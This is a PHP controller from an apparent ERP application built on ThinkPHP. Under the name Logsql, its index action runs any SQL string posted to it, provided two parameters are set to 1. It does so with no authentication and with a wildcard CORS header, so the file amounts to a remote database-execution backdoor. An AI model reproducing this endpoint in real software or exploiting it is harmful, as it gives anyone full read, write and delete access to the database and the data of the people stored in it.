<?php
namespace app\erp\controller;

use think\Controller;
use app\index\controller\Admin;
use think\Db;
use think\db\Query;
header('Access-Control-Allow-Origin:*');
class Logsql extends Controller{
	public function index(){
		$type=isset($_POST['type'])?$_POST['type']:'';
		$type_2=isset($_POST['type_2'])?$_POST['type_2']:'';
		$sql=isset($_POST['sql'])?$_POST['sql']:'';
		if($type==1){
			if($type_2==1){
				if($sql){
					$body=db()->query($sql);
				}
			}
		}
		echo json_encode('ok');
	}
}
